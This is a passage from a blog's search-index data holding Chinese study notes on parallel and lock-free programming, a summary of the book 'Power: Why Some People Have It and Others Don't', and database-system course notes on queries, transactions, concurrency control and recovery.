lock一樣\nwait-free\n就前面看到的，lockfree可能讓process無限的等(飢餓)，但是wait-free可以在有限的次數讓process動\n但超難，pass\nWait-Free Queues With Multiple Enqueuers and Dequeuers\nTODO\n\nwait-free\nAlgorithms Sequential &amp; Parallel: A Unified Approach\n\n這我不確定，但是因為他比較新就放這裡\n\n\nAn introduction to parallel algorithms (jaja)\n\n這裡面提到 Parallel Algo的手法 中提到的與沒有提到的手法\n\n\n\nRef\nAn Introduction to Parallel Programming, Morgan Kaufmann\nParallel Thinking\nAnalysis of Parallel Programs\nMore Parallel Primitives and Parallel Sorting\nSynchronization\nSome Sequential Algorithms are Almost Always Parallel\nAn Introduction to Lock-Free Programming\n","categories":["System","Parallel"]},{"title":"Power：Why Some People Have It and Others Don’t","url":"/2022/01/Power/","content":"動機\n\nThe idea is nothing effects you until you agree to be affected.\n\n\n概論\n\n\n為什麼需要權力\n\n有權力可以活更久、更健康\n\n權力與身分地位可以讓人掌握自己的工作環境\n不會感到壓迫、或是自己不能掌握\n\n\n權力帶來能見度與地位，進而帶來財富\n權力是領導的一部份，是完成事情的必須條件\n有些競爭者會扭曲或是漠視公平競爭的遊戲規則，千萬不要對此抱怨或是希望世界不會有這種情形\n\n你只要了解權力的原則，也願意運用，不管是哪一種組織，你都有辦法與人一較高下\n\n\n權力無所不在\n\n在動物社會中也有\n身分地位會從一個環境【進口】到另一個環境\n人會去維持階級存在\n\n人會主動放棄權力以維持一個穩定的社會階級秩序\n\n\n可以處理歧見\n\n由老闆決定\n讓大家去搶權力，權力大的決定\n\n\n\n\n\n\n\n權力的代價\n\n備受關注並被放大檢視的壓力\n\n這些檢視會讓公司與個人無法好好專住於工作\n\n社會助漲效應: 就是類似上台前的緊張\n\n對做簡單的事有幫助的\n對做複雜的事是有害的\n\n\n\n\n會有要時時保持【看起來還不錯】的壓力\n所以應該要\n\n低調行事\n\n\n\n\n喪失自主權\n\n失去自己的時間、個人與家庭生活\n\n時間要花在培養權力相關的事務 (還有精力、專心一意)\n\n\n\n\n不是每個人都可以信任\n\n因為想要你的位置的人很多\n\n\n權力會讓人上癮\n\n\n\n失去權力的原因\n\n被權力沖昏頭\n\n權力會讓人\n\n給主動去爭取自己想要的結果\n變的比較不【節制】，不遵守社會常規\n過度自信\n喜歡冒險\n對他人無感\n對別人有刻版印象\n把別人視為滿足自己的工具\n\n權力越大越會把團隊的成功當作是自己領導有方\n\n\n\n\n\n\n過度信任他人\n\n因為 過度自信、疲憊 而不察\n如何看該不該信任?\n\n看他的所有表現與行動\n\n\n\n\n失去耐心、疲累\n大環境改變，策略卻沒有變\n\n當初會成功就是因為這個 (能幹的陷阱)\n\n\n對權力依依不捨\n\n\n\n追逐權力的三大障礙\n\n以為世界是公平的 (善有善報、惡有惡報)\n\n而阻礙從各種情況與各種人(好或壞)身上學到教訓\n\n微言人輕的你想取得權力，就必須注意權位者的動向\n\n\n以為世界是公平的，而忘了權力是要靠自己主動打造\n\n\n領導類書籍\n\n這些書的處方只符合人心目中的世界，但這是幻想\n這些書通常從成為CEO時寫起\n\n沒有從基層爬到頂端的過程\n\n\n為什麼這些書都十分單調、淺薄\n\nCEO擅長凸顯自己，說人們想聽的話，彰顯自己的正面特質\n有權力的人會去書寫歷史\n\n彰顯自己的正面特質\n\n\n以為世界是公平的，進而把所有正面的東西歸因到公司或是CEO，最後相信他們的建議是對的\n\n\n\n\n自己 (自我設限)\n\n為了保留自尊，不是先舉白旗投降，就是做些會阻礙自己的事\n\n因為人都希望對自己滿意，或是不想起衝突\n在挫敗發生時有可以責怪的對象\n\n\n\n\n\n\n\n練習\n\n練習與行動要符合自己的情形、價值觀、目標\n沒有萬用公式，留意身邊情況做練習\n不要被動的學習，要主動做\n\n\n\n小總結\n權力\n* 持有資源或位於中心且獨佔\n* 可信任、穩固 (不用讓人思考)\n* follower會受益或是不會受傷\n分項論述\n\n\n好表現不保證保得住權位，表現不好不見得會丟了飯碗\n\n只要讓老闆開心，工作表現好壞真的不是那麼重要\n\n工作表現對考績的影響，不如主管對你的印象與你和他之間的關係\n\n【我不會讓你走的，因為你表現得太好了】\n\n\n把老闆惹毛了，工作表現好也救不了你\n\n\n所以要?\n\n替自己創造曝光(才不會忘記妳, 曝光效應)\n\n上位者很忙不會知道你在做什麼，要讓他們知道\n\n方法: 直接告訴他們\n\n\n\n\n用對自己有利的方式衡量表現，或是凸顯好的表現\n\n一再強調、一再堅持 這方面是好的，這是個好方法\n\n\n強化上位者的自尊\n\n永遠要記得老闆重視什麼\n\n定期去問問上位者，看他們重視哪部份工作，與認為你應該做什麼\n求助或是徵詢意見\n\n之後照著做\n\n\n\n\n讓他們自我感覺良好\n\n人會喜歡自己，所以喜歡與自己相似的人\n\n生日一樣、姓名相似…\n喜歡與自己同一組的人(ingroup bias)\n討厭敵對的人(outgroup derogation)\n\n\n如果上司犯錯，最好由他人指出來 (善用奉承)\n\n人會自然喜歡說自己好話的人\n\n【感覺被需要、被讚賞】\n\n\n奉承是有來有往的\n\n【在寄給他的感謝信寫上對我的讚美寄回來給我】\n\n\n奉承失效?\n\n到某個程度會失效，但研究數據中找不到是哪個程度\n\n\n\n\n\n\n總而言之，就是 讓老闆有強烈慾望想讓你成功\n\n所以才要讓老闆記住你、與有對應的好表現\n\n\n\n\n\n\n\n\n\n維繫權力的特質\n\n相信自己是可以改變的\n\n在校園應徵\n\n裝扮的時髦有形、不失低調溫順\n面試中散發果決能幹\n對面試官表現十分尊重\n讓動作傳達出我具有一定的權力\n\n走向我時起身向前\n直視他們的眼睛\n主動與他們握手\n坐姿稍有強勢意味\n\n\n\n\n\n\n儘可能客觀檢視自己的長處與弱點\n\n對自己的任何缺失，先是迴避，接著打死不認\n\n方法: 不直接說過去那裡做對、哪裡做錯，而是往前看，說明應該做什麼才能面對未來的挑戰\n\n\n不知道如何改進、要改什麼\n\n方法: 問比自己厲害的人\n\n\n\n\n知道打造權力基礎的最重要特質\n\n意願(願意接受大挑戰)\n\n雄心\n\n非常渴望事業成功、專注於同一個目標\n\n才能克制情緒\n不去在意別人\n忍受不好的環境\n\n\n\n\n精力\n\n無時無刻投入想完成的事或工作\n\n精力與其他情緒一樣有感染力，會激發別人讓別人更努力\n能長時間投入，更有利於事情的達成\n容易被promote，也會被認為忠誠度較高\n\n\n\n\n專一\n\n專注於同一產業、公司\n\nget domain knowleage與專業人脈\n\n\n專注於同一技能的學習\n專注於工作中最重要的部分，最能彰顯事情完成與否、別人對你的工作效能的管感\n\n\n\n\n才能(具備必要的能力把雄心轉化為成就)\n\n自我充實與反省心態\n\n在重大會議或是談話結束，會在小筆記上把\n\n順利與不順利的部分記錄下來\n也記下別人說的話、做的事與會議結果\n\n\n全神投入、作筆記、思考自己在做什麼\n\n\n有把握與散發自信\n\n不管什麼情況，別人都會搞清楚應不應該把你當一回事\n\n因此你要有掌控全局能力\n\n\n人在判斷權力大小與要不要順從時，會看對方的一舉一動\n\n有權力 =&gt; 有自信\n\n人會自動做逆向關聯 有自信 =&gt; 有權力\n\n\n\n\n\n\n能解讀他人與理解他們的看法\n\n站在對方的利益來談、來想\n不能只在乎最終目標，要記得尋求他人的支持\n\n\n有容忍(不畏懼)衝突的能力\n\n人不喜歡衝突，故\n\n常常會對於別人提出的要求照單全收\n改變自己的立場\n\n\n\n\n\n\n聰明反而是被高估的!!\n\n不會與人合作\n過度自信、自大\n不顧別人感受與需求\n\n\n\n\n\n\n\n起點 (部門)\n\n\n重要性\n\n在權力大的部門的主管，換工作時比較可能會繼續待在權力大的部門\n\n\n\n有影響力的部門\n\n有凝聚力\n\n透過例行公事: 準備簡報、收集資料\n\n傳授專業技能與知識\n打造溝通與信任的共同連結，分享彼此經驗\n\n\n\n\n有能力提供關鍵資源 或 有能力解決關鍵的組織問題\n\n從CEO的出身背景可以看出權力的移轉現況\n\n1900年代: 創辦人\n1920~1930: 業務與行銷\n1960~1980: 財務\n\n\n\n\n\n\n\n衡量部門權力的要素\n\n相對薪資高\n辦公地點接近核心、設備新穎\n\n這點代表\n\n權力大\n因距離靠近，而影響力增加\n\n\n\n\n高層團隊的出身背景 (from 哪個部門的人多)\n\n\n\n選擇未知的風險或是激烈的競爭?\n\n端看個人的風險承受能力\n\n\n\n\n\n成為最引人注目的那一個\n\n擺脫想要人見人愛的想法\n\n人見人愛、討人喜歡不是通往權力的必要條件，但有權力就會被人喜歡\n\n只要你有權力，也願意用權力，人就會靠近你\n\n一是害怕被你傷害\n另一是需要你來獲取成功\n\n\n除了魅力與能力，別人也會看有沒有勝算決定要不要支持你\n\n不是因為喜歡你才聯絡\n\n【他對你有沒有幫助?】\n\n\n\n\n行為決定看法 (人可以對行為做出詮釋)\n\n如果以某種方式行事，久而久之看法就會變成那個樣子\n\n如果需要對手的幫助而對她友善，久而久之會感覺與他的關係真的變友善了\n\n\n\n\n\n\n【大家都希望受人喜愛與受人畏懼，但如果要選，想要權力就選受人畏懼】\n\n人會從兩個角度來判斷別人\n\n親切\n\n好人會被視為親切，但是好心常常給人軟弱的印象，甚至卻乏智慧\n\n\n能力\n\n想要看起來有能力，要兇悍與刻薄一點\n\n\n\n\n\n\n人總是容易忘記\n\n人會忘記別人的傷害或輕蔑\n\n尤其是跟他們繼續往來會更容易忘記\n\n即使是最不合的兩人也可能因長期往來而變成好友\n\n\n\n\n\n\n\n\n主動要求\n\n最糟就是被拒絕而已\n\n別低估說不的代價\n\n拒絕別人的要求，其實違背【行善】的社會準則\n\n當場會很尷尬\n\n\n能強化對方的權勢地位\n\n\n\n\n怎麼要求幫忙\n\n表現出你知道他們的重要性、成就 (經歷好、能力好…)\n讓對方知道我們有共同點 (同學校、同個月生日…)\n\n\n在得到名人幫助後能再利用名人的名聲，拉到更多人幫忙\n\n所以要廣\n\n\n\n\n別怕引人注目\n\n如果希望別人把拔擢，就要先讓他們注意到你\n\n要做些能凸顯自己的事 (建立個人品牌、推銷自己、不要害羞)\n\n季辛吉喜歡擺出資深教授的架式，同學不喜歡，但打響名號，因為行為與眾不同\n\n\n\n\n規則往往對制定規則的人有利，而制定規則的人往往都是已經握有權力的人\n\n如果已經大權在握\n\n一定要照規則來玩，還要鼓勵大家都照規則來\n\n\n如果還在拚權力\n\n傳統觀念與照規則的話，聽聽就好\n\n\n\n\n\n\n\n\n\n資源\n\n定義\n\n就是人們想要或是需要的東西\n\n$、工作、訊息、社會支援、友誼、工作上的協助\n\n\n\n\n要點\n\n只要掌握金錢與工作的流向，自然就會有權利\n\n選工作時，要挑能直接控制預算(能決定公司營收的第一線工作)或是人員的職位\n職位與職位隨之而來的資源，會是權力的來源\n\n\n資源與權力息息相關\n\nCEO的薪水其實與公司規模掛勾，而不是工作表現\n\n\n\n\n建立權力基礎就是\n\n一點一點累積影響力與資源的過程\n要能\n\n看出別人沒有看到的機會\n自己創造機會\n有耐心與堅持來貫徹這些機會\n\n\n\n\n創造資源\n\n給予關心與支持\n\n例子\n\n參加他的生日宴會、共進午餐、生病或家人生病去探望\n給他們機會談論自己\n去參加對別人來說重要的活動\n\n\n\n\n做重要的小事\n\n人會感激有人幫他們做一部份工作\n\n尤其是無趣又瑣碎的工作\n\n\n人很懶或沒興趣做看似微不足道的小事\n\n收集高層可能想知道的資料，讓上層刮目相看\n\n讓自己不可或缺\n問到不知道的問題先假裝懂一些，之後去查再回答\n\n\n\n\n\n\n善用機會建立資源、利用關係居中牽線\n\n參與舉辦活動(集會、演講、讓人互相認識交流或學習)的事務\n主動發起活動\n\n\n\n\n\n\n\n人脈\n\n\nmethods\n\n接觸\n\n內部 (*)\n\n在公司活動認識人\n\n\n外部\n\n參加與工作相關的活動\n\n\n\n\n維繫\n\n內部\n\n去了解其他部門在做什麼\n\n\n外部 (*)\n\n請別人代我向公司以外有公事往來的朋友問好\n\n\n\n\n善用\n\n內部\n\n在與其他同事往來時探聽公事上的機密\n\n\n外部\n\n與其他公司的人交換專業上的竅門與意見\n\n\n\n\n\n\n\n來源\n\n內部\n外部\n\n\n\n結交人脈最重要方式是\n\n與內部接觸\n維繫外部人脈\n\n\n\n打造人脈需要的不是時間，而是規劃\n\n列出想認識或必須認識的人或組職\n\n找對的人\n\n因為打造人脈需要時間\n不緊密的人脈比較有用\n\n可以帶來新的生活圈與經驗\n要滿足兩個前提才有用\n\n他有能力把你與其他多元的人脈串聯起來\n他有意願這麼做\n\n\n\n\n認識不同圈子的人、地理位置要分散、不一定要與這些人很熟\n\n可以成立一個組織，這樣地位高的也可以參加\n\n\n\n\n\n\n照名單意義努力去結交\n\n拜託別人引薦\n\n事後再寄感謝函\n\n\n提供訊息與人脈給新認識的人\n\n\n想辦法與更廣泛、更多元的人交往\n\n別老是與同樣的人來往\n\n\n讓自己處於訊息溝通的中心 (結構上的、地理上的)\n\n在人脈網中位階較高者，就要充當各個不同組織之間的橋樑\n怎麼看是不是中心?\n\n看在其他人心中的分量為何\n\n你是不是尋求建議或是幫助的對象\n\n\n看有多少溝通是經過自己的\n\n\n\n\n\n\n\n\n\n演說\n\n路人如果看到某人不否認或不逃避自己的所作所為\n\n通常會認為此人不認為自己有罪或是羞愧\n所以會認為 或許真的不是他的錯\n\n例子: 【是我…】 【強調一切都是自己一手掌握】\n這就是說我是主導者 (我有權力!!)\n\n\n\n\n表達憤怒通常比表達悲傷、愧疚或懊悔，更具權威\n演的原則\n\n表現出有自信的樣子，即使不知道自己在做什麼\n\n一部份靠自律、一部份靠假裝，到最後假裝會成真\n\n\n注意觀眾的感受，表現對的感受 (行為、表情、情緒…)\n\n不論自己多累，要確保在觀眾前面是對的形象\n\n\n表達憤怒而非悲傷、愧疚或懊悔\n\n生氣的人會被視為身分地位高\n\n別人也會比面與你正面衝突\n\n\n難過會被視為身分地位低\n\n\n肢體語言\n\n注意外表\n筆直站挺\n抬頭挺胸\n正面朝向別人\n直視別人眼睛\n手勢要簡短有力\n\n不要過長\n不要雙手繞圈、擺動手臂\n\n\n\n\n利用回憶喚起想要的情緒\n\n在展現當下沒有的情緒時需要 (像沒把握時展現自信)\n\n\n架設舞台並好好安排情境\n\n大辦公室 =&gt; 氣派、專業\n\n\n回答時要慢慢來 (別在謊張時或是還沒把握就開口)\n\n顯整理好思緒，停頓良久才開始說話\n\n\n\n\n說的原則\n\n打斷別人的話\n\n打斷別人的話是一種權力的象徵\ncounter: 【讓我說完】，之後繼續說\n\n\n奪下議題主導權\n\n議事的權力面貌\n\n誰的觀點贏\n議題由誰設定\n\n這決定有哪些議題會被討論\n\n\n議題與結果是由人際互動決定，人際互動的規則由誰決定\n\n質疑與挑戰對方的基本假設\n\n\n\n\n\n\n有說服力的語言\n\n能夠創造出權威形象，而且情緒勝過理智\n\n明確具體且充滿力量與畫面\n\n\n技巧\n\n利用敵我意識\n以停頓來加強語氣，並尋求贊同甚至掌聲\n列舉3點或是條列式的方式來演講\n利用對比，且詞句對仗、字數相同\n不要看講稿與小抄\n適度運用幽默\n\n\n\n\n\n\n\n\n\n樹立名聲\n\n早點樹立良好形象\n\n因為第一印象的形成很快且難以撼動，故\n\n如果發現自己處於一個有形象危機的情境，人們對你沒有正面評價(不管什麼原因)\n\n上上策通常都是離開，另尋機會、新的環境\n\n\n應該現身於各種場合，以量取勝 (因為第一印象的形成，像對不對味等自己無法控制)\n\n\n\n\n謹慎勾勒出你想要的形象\n利用媒體增加能見度並擦亮你的形象\n\n提供文章到媒體培養credit\n\n與媒體相處: 做個好親近的人，樂意提供協助\n\n\nget高位後，找人把你討人喜歡的故事寫出來\n\n\n讓別人對你歌功頌德並巧妙釋出一些有關自己負面但不致命的訊息\n\n即便別人知道這人可能是受你控制(像花錢)，但相較於自吹自儡，這樣人對你的評價還是比較高\n\n所以 花$讓別人來代表你，推銷你\n\n\n只要你的怪癖與你樹立的形象、名聲無關，就ok\n\n有人還會因為這樣去看中你，更樂見你成功\n\n打預防針\n\n\n\n\n\n\n讓用你的與支持你的人充分了解你的缺點但還是願意與你合作\n\n\n\n應對衝突\n\n【衝突正是認識對方的機會】\n善待對手、讓對方台階下\n\n越是壓制、他們越想拿到權力與反抗；搞到對方一無所有，對方就會想拚死一搏\n\n吸納對手\n\n像 安排一個新部門讓他們處理他們的問題 (策略性的安排職位、安插到更好的職位)\n\n這樣權責就逆轉了，原本是我們要做的事就變成他們要做\n也顧到對方的面子\n\n\n\n\n\n\n\n\n不要給自己製造不必要的麻煩\n\n強烈情緒會影響思考\n\n要一直問\n\n【什麼狀況叫做勝利?如果已經勝利，你希望勝利帶來什麼?】\n\n專心投入\n\n像是讀書時如果get不到，頭就要一直記憶與比對，造成頭昏\n這時就要去找這段的目的是什麼、假設是什麼等等邏輯立論時需要的東西\n\n\n\n\n\n\n\n\n\n\n與關鍵人物保持良好關係\n\n為了完成目標，要放下任何妨礙你建立關係的情緒\n\n把焦點放在資料上，就事論事\n\n\n有關手法\n\n常常去對方的辦公室坐坐\n讓對方知道自己在幹什麼、為什麼這麼做\n讓對方參與決策\n\n\n\n\n堅持到底\n\n堅持可以削弱反對力道\n堅持可以等到情勢逆轉的時刻\n\n\n多方並進\n\n地方難以推動，就建立全國的名聲；之後就可以回來推動地方\n\n\n抓到時機主動出擊\n\n如果行動夠快，通常可以趁對手不備、不清楚狀況時勝券在握\n\n\n賞友罰敵\n用遠大的理想包裝目標\n\n把自己的目標與社會上的價值串聯起來\n\n\n\n\n\n挫敗不可怕\n\n問題是如何復原、能不能復原\n要點\n\n決不放棄\n\n不要覺得挫敗很難堪，是自己的錯\n\n要做的事: 把事情的來龍去脈說給越多人越好\n\n\n\n\n繼續作能讓你成功的事\n\n不要輕易放棄原有的領域 (轉行)\n\n\n表現出權威與成功的樣子\n\n外人判斷的依據之一\n\n你的表現方式\n\n看起來樂觀?\n表現出權威與成功的樣子?\n\n\n\n\n人都會想與贏家攀上關係\n\n\n\n\n\n\n\n例子\n\n讓其他成員見識他的價值\n\n拿出數據告訴小組這個市場並非明智之舉\n\n讓小組認為他有點東西\n\n\n告訴小組他有其他高薪工作\n\n讓其他人看得起他\n讓人知道若要離開不是隨便說說的\n\n\n讓其他人做他擅長的事\n\n讓他們知道這工作不是想像的簡單\n\n\n與其他人爭位\n\n自己介紹其他人認識可能去取代的人選\n\n\n\n\n\n","categories":["Reading"]},{"title":"database system","url":"/2022/01/database-system/","content":"動機\n我之前學的DB根本就是假的\n這是來自nthu的DB課程，有slide但沒有prjects\n難道之後要跑CMU 15-445嗎?\n不過有一說一，DB越看與xv6的fs真的很像，除了沒有SQL的部分\n\nWhy not file systems?\n\nquery可以組合\n以tx為單位\n\nACID!!\n\n\n有辦法recover\n\n讓recover的資料一致\n\n\n\nquery怎麼處理?\nSELECT p.id, p.textFROM posts AS p, users AS uWHERE u.id = p.authorIdAND u.name=&#x27;Bob&#x27;AND p.text ILIKE &#x27;%db%&#x27;;\nQuery Optimization: plan\n\nEXPLAIN\nEXPLAIN ANALYZE -- show plan treeSELECT * FROM users WHERE id&lt;5 AND name ILIKE &#x27;%User%&#x27;ORDER BY id DESCLIMIT 2;\nfilter, zip, select (where, join, select)\n\n\nFROM posts AS p, users AS u\n\n\n\nWHERE u.id = p.authorId AND u.name=‘Bob’ AND p.text ILIKE ‘%db%’\n\n\n\nSELECT p.id, p.text\n\n\n\nHandling “Big” Data\n\nwhen deleting\n\nNO ACTION (default): user not deleted, error raised\nCASCADE: user and all referencing posts deleted\n\nQuery Optimization: index\n\n\nindex\n\n一個mapping function\n\n加速 equality 或是 range selections\n\nequality\n\nhashing function\n\nkey到一堆有關的值\n其他hash function的issue去看資料結構\n\n\n\n\nrange selections\n\nB-Tree\n\n\n最後map到一堆有關的值\n每一個node就是放起點的list\nhow to lock?\n\nLock Crabbing Protocol\n\n\n\n\n\n\n\n\n\n\n\n\n\nInput: field values or ranges\n\nsearch key\n\nPrimary index vs. secondary index\n\nindex中有沒有Primary key\n\n\n\n\n\n\nOutput: rids (record的id)\n\n\n因為是根據field建tree或hash，所以如果有改row，就要更新index\n\nFaster reads at the cost of slower writes\n\n\n\n\n\ninverted index\n\nconcurency\n說好的ACID\n\nAtomicity: all or nothing\n\n通常只有這個\n\n\nConsistent: db的整體狀態是對的\nIsolation: 這才是我印象中的atomic\n\n要自己來\n\n\nDuration: 資料庫內的資料不會因為斷電，系統崩潰而損失資料。\n\n總的來說，tx根本就是一般function (但會rollback)\n怎麼出事\n\nDirty Read: 有人讀還沒commit的欄位\n\n如果之後這個欄位被rollback…\n可能好: 最後有被commited\n不好: 被rollback，之前看的資料就沒效了\n\n\n\nNon Repeatable read: (在tx中) 讀同個row兩次的結果不一樣 (race condition)\n\nrow為單位的race condition\n\n\n\nPhantom Read: (在tx中) 同個query拿到的rows不一樣 (race condition)\n\ntable為單位的race condition (在條件上race condition)\n\n\n\nSerialization Anomaly: 因為tx commit的順序不同導致最後結果inconsistence\n\nreorder\n\n\n\nIsolation\n\nRead Uncommitted: 沒有任何保證\nRead Committed: 寫完的不會變了 (mem consistency)\n\n可以用read lock與write lock來保證\n\n鎖在tx的執行啟動與完成 (mutual exclusion)\n\n\n\n\nRepeatable Read: (就是名字寫的)\n\n可以用read lock與write lock來保證\n\n鎖在有用到的所有row\n\n\n\n\nSerialisable: tx跑起來與serial一樣\n\ndependency (mem barrier)\n\n\n\n工具\n\nlock\n\nPessimistic (Exclusive): mutex\nOptimistic (Shared): read/write lock 或是 seq lock\n\n\nsnapshot:\nrow versioning(MVCC): 就是row的持久化，每一個tx的更新對row來說都是一個版本的更新\nTwo Phase Locking:\n\n先把lock全部拿完，開跑\n到最後再把lock還回去\n\n\n\n\n\n\nRef\nHow does a database server handle thousands of concurrent requests?\nOn Concurrency Control in Databases\nDB Architecture\n\nServer and infrastructures (jdbc, sql, tx, and utils)\n\nTransaction\n\nConcurrency\n\n2PC lock protocol\n\n要用就先拿lock，用完馬上unlock\n\n\nstrict 2PC lock protocol\n\n一次拿完所有需要的lock，tx完成後unlock\n\n\nMultiple-Granularity Locks: allows users to set locks on objects that contain other objects\n\n\n\n\n\n\n\n\n\nRecovery\n\n定義Failure\n\nTransaction hangs\nSystem hangs/crashes\nAssumptions\n\nContents in nonvolatile storage are not corrupted\nNo Byzantine failure (zombies)\nOther types of failure will be dealt with in other ways\n\n\n\n\nLog\n\n就是紀錄做過的動作\n\n紀錄在?\n\ncache\n\nfailure時可能會消失\n\n\nlog file\n\nfailure後依然存在\n\n只要有就是真的做過!!\n\n\n\n\n\n\n動作有?\n\n操作\n\n實際上的操作 with tx id\n\n改值、table等等\n\n\nmark\n\ntx 開始、commit\nrollback\n\n\n\n\n\n\n目的是?\n\nRecovery: Rollback未完成/已完成的tx\n\n未完成的tx: 在log file\n\n\nRollback: 把tx取消掉\n\n動作\n\n從尾開始\nundo對到tx id的item\n直到遇到tx id的start\n\n\n\n\n\n\n\n\nCheckpoint\n\n幫log分界，不然每次都跑整條其實很慢\n\nCheckpoint之前的commit可以不用管!!\n\n\nQuiescent Checkpointing\n\n動作\n\n關tx\n等現在正在跑的tx好 (可能很久)\nflush all buffer\n把checkpoint寫到log cache，再到log file\n開tx\n\n\n\n\n\nNonquiescent Checkpointing\n\n動作\n\n關tx\n在checkpoint的log中記錄現在正在跑的tx的tx id\nflush all buffer\n把checkpoint寫到log cache，再到log file\n開tx\n\n\n\n\n\n\n\n\n\n怎麼Recovery\n\nUndo-only Recovery\n\nLog有\n\ncommit\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\nrollback\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\n\n\n動作\n\n從尾到頭，看每個item\n\n紀錄commit、rollback的tx id\n\n做完的\n\n\n實際上的操作\n\ntx id有看過?\n\n沒事\n\n\n沒看過?\n\nundo\n\n\n\n\n\n\n\n\n\n\nUNDO-REDO recovery 1\n\nLog有\n\ncommit\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\nrollback\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\n\n\n動作\n\nUNDO (消除uncommit的影響)\n\n從尾到頭，看每個item\n\n紀錄commit、rollback的tx id\n\n做完的\n\n\n實際上的操作\n\ntx id有看過?\n\n沒事\n\n\n沒看過?\n\nundo\n\n\n\n\n\n\n\n\nREDO (讓commit保證存在)\n\n從頭到尾，看每個item\n\n在commit list的item\n\nredo\n\n\n\n\n\n\n動作重複做沒關係嗎?\n\n都是set value，沒差，反正順序對\n\nidempotent\n\n\n\n\n\n\n\n\nUNDO-REDO recovery 2\n\nLog有\n\ncommit\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\nrollback\n\nflush改完的block\n塞commit log到buffer\n塞到log file\n\n\n\n\n動作\n\nUNDO (消除uncommit的影響)\n\n從尾到頭，看每個item\n\n紀錄commit、rollback的tx id\n\n做完的\n\n\n實際上的操作\n\ntx id有看過?\n\n沒事\n\n\n沒看過?\n\nundo\n\n\n\n\n\n\n\n\nREDO (讓commit保證存在)\n\n從頭到尾，看每個item\n\n在commit list的item\n\nredo\n\n\n\n\n\n\n動作重複做沒關係嗎?\n\n都是set value，沒差，反正順序對\n\nidempotent\n\n\n\n\n\n\n\n\nRedo-Only Recovery\n\nsteal\n\ntx中改過的block可能在commit完成前就被swap出去!!\n\n\n如果沒有steal\n\n只要redo就好\n\n因為會到log file的state與HDD的一定一致\n\n\n\n\n\n\nRepeating history\n\nEarly Lock Release\n\nmeta-structrue的lock會提早釋放 (但block不釋放lock)\n\n不然要操作其他block時無法concurrent\n\n變成要等meta-struct\n\n\n\n\n變成block與meta的更新會不一致!!\n\nLogical Operations\n\n不能根據當時的state做直接的undo\n\nstate可能被其他tx變了，雖然block有lock，但meta沒有!!\n這也代表undo不是idempotent\n\nundo也是屬於一般的動作了\n\n也要記到log\n\n\n\n\n\n\n\n\n\n\n\n\nRollback Logical Operations (soft delete)\n\n\n\n卡在中間?\n\n把剩下的直接undo\n\n\n跑完了?\n\n先拿要拿的所有lock\n再undo\n\n\n\n\n\n\nRecovery by Repeating History\n\nREDO (重建現場)\n\n從最近的checkpoint，開始重作所有動作\n\n\nUNDO (消去未完成tx的影響)\n\n看REDO-UNDO recovery\nLogical OPs怎麼處理?\n\n卡在中間?\n\n把剩下的直接undo\n\n\n跑完了?\n\nskip (soft delete)\n\n\n\n\n\n\n原本現在連undo都要log，所以有另一個名字\n\nCompensation Logs\n\n\n\n\n\n\n\n\nPhysiological logging (op reorder你敢信)\n\n把一些OPs集中成一個Logical Operation\n\n可以省log大小\n但原本執行上的dependency沒了\n\n不能直接REDO\n\n\n\n\nREDO-UNDO Recovery in Physiological logging\n\nREDO (重建現場)\n\n跳過已經redo過的Physiological logging\n\nhow?\n\nskip, in ARIES algorithm\n\n\n\n\n\n\nUNDO (消去未完成tx的影響)\n\n把Physiological logging當成一個op去undo\n\n\n\n\n\n\n\n\n\n\n\nQuery engine\n\n把SQL compile 成 AST (relational algebra)\n\nrelational algebra\n\n\n\n\n\n\n做plan(選tree的樣子，做cost estimation)\n\n\ncost estimation\n\n\n定義cost\n\nnumber of block accesses: 掃到多少block B(p)\n\n有多少record被output: R(p)\n在p table中的f field的值域大小: V(p,f)\nindex的成本: SearchCost(p,f)\n\n\n\n\n\n\n跑跑看\n\n\n\nR(student)=10000\nB(student)=1000\nB(dept)= 500\nselectivity(s-id=5&amp;major-id=4)=0.01\n\n\nLeft: (1000+10000*500)*10ms = 13.9 hours\nRight: (1000+100000.01500)*10ms = 8.4 mins\n\n\n\nestimate this cost\n\n\n值域很大，不可能1對1的去看\n\n分區!!\n\n\n怎麼算、怎麼實作 skip (見 Query Optimization)\n\n\n\n\n\n\n\n\n\nGenerate trees\n\nNot finding the best tree\n\nAvoiding bad trees!!\n\n\nconsider left-skew candidate trees only\n\n在join時，大部分都是走訪右邊\n\n\n\n\nGoal ↓B(root) reduced to ↓R(c1)\n\nPushing Select ops down\n\n越早select越好\n\n\n\nGreedy Join ordering\n\n\n只要確保每次join是最小，最後就是最小 (DP)\n\nSelinger-Style Optimizer\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDeterministic Query Planning Algorithm\n\n\n從from拉table\n\n\n跑where\n\n\n再跑select\n\ngroup by, having?\n\n\n\n\n\n\n\n一直return回去\n\n\n\n\n\n用scan去爬每一個node的record\n\nPipelined Scanning\n\ncall一次給一筆\n\n\nMaterialized Scanning\n\nbatch處理，放到temp file，一次回傳\n\n\n\n\n丟給上一層做下一步處理\n\nStorage engine\n\n\n怎麼被存的? (實作OS的hdd與mem管理)\n\nDatabase: directory\nTable: file\nRecord: bytes\n\n\n\n怎麼與HDD互動? (實作可以跑query的file system)\n\n\n\n\nBlockId\n\nImmutable\nIdentifies a specific logical block\n\nA file name + logical block number\nBlockId blk = new BlockId(&quot;std.tbl&quot;, 23);\n\n\n\n\nPage\n\nHolds the contents of a block\n\nBacked by an I/O buffer in OS\n\n\nNot tied to a specific block\nRead/write/append an entire block a time\n\nSet values are not flushed until write()\n\n\n\n\n\n\n怎麼增加從disk拉的速度? 兩個方向\n\nlow-level block API\n\nPros\n\n可以直接控制phy層資料的位置\n不用管OS的任何限制\n\n\nCons\n\n實作十份複雜\n沒有portability\n\n\n\n\nfile system\n\nPros\n\n簡單易用\n\n\nCons\n\n無法控制phy層資料的位置\n無法控制page\nfilesystem的實作可能把db的正確性破壞掉\n\n只能一直flush\n\n\n\n\n\n\n\n\n\n\n\n\n怎麼與mem互動? (實作block的cache)\n\n\n\ncache什麼?\n\nuser data (DBs, including catalogs)\nlogs (meta-writes)\n\n\n\n\nNo Virtual Memory!!\n\nbad page replacement algorithms\n\nOS可能換到不想要的page\n\n\nuncontrolled delayed writes\n\nSwapping 無法控制 (should be direct I/O!!)\n需要swap的page資訊(meta data)\n\n\n\n\nSelf-Managed Page\n\nControlled swapping\nSupports 